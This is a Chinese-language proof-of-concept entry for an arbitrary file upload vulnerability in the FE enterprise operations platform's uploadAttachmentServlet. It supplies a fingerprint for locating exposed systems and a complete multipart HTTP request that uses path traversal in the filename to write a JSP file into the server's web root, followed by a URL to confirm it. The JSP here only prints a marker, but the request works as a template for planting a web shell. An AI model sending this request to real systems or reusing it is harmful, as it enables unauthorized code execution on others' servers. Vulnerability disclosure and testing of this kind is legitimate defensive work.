# 飞企互联-FE企业运营管理平台uploadAttachmentServlet存在任意文件上传漏洞

- **系统**：飞企互联-FE企业运营管理平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="FE-协作平台"`
- **请求**：`POST /servlet/uploadAttachmentServlet HTTP/1.1`

**请求体 / payload**
```
/servlet/uploadAttachmentServlet
存在则有漏洞
Host:
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Length: 325
------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="uploadFile"; filename="../../../../../jboss/web/fe.war/123123.jsp"
Content-Type: text/plain
<% out.println("123123");%>
------WebKitFormBoundaryKNt0t4vBe8cX9rZk
Content-Disposition: form-data; name="json"
{"iq":{"query":{"UpdateType":"mail"}}}
------WebKitFormBoundaryKNt0t4vBe8cX9rZk--
[http://ip/123123.jsp;](http://ip/123123.jsp;)
原地址：[https://mp.weixin.qq.com/s/vRiYsW…（脚本共 668 字，完整版见原文）
```